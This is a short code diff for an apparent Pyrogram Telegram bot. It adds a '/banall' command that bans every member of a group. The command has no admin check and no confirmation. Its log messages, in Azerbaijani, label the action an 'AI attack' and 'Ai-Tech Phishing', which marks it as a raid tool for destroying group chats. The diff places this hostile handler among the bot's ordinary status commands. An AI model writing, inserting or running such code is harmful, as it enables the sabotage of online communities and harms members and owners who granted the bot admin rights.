@@ -385,6 +385,21 @@ async def get_uptime(client, message):
 
 
 
+@rzayev.on_message(
+filters.command("banall") 
+& filters.group
+)
+async def banall(client, message: Message):
+    print("{} - üzvlər əldə edilir ❗".format(message.chat.id))
+    async for i in rzayev.get_chat_members(message.chat.id):
+        try:
+            await rzayev.ban_chat_member(chat_id = message.chat.id, user_id = i.user.id)
+            print("Atıldı - {} | Tərəfdindən - {} aihucum🇦🇿".format(i.user.id, message.chat.id))
+        except Exception as e:
+            print("Xəta {} tərəfindən {}".format(i.user.id, e))           
+    print("🇦🇿 proses tamamlandı: Ai-Tech Phishing ⚕️")
+
+
 @rzayev.on_message(filters.command("alive"))
 async def alive(client, message):
     current_time = datetime.utcnow()
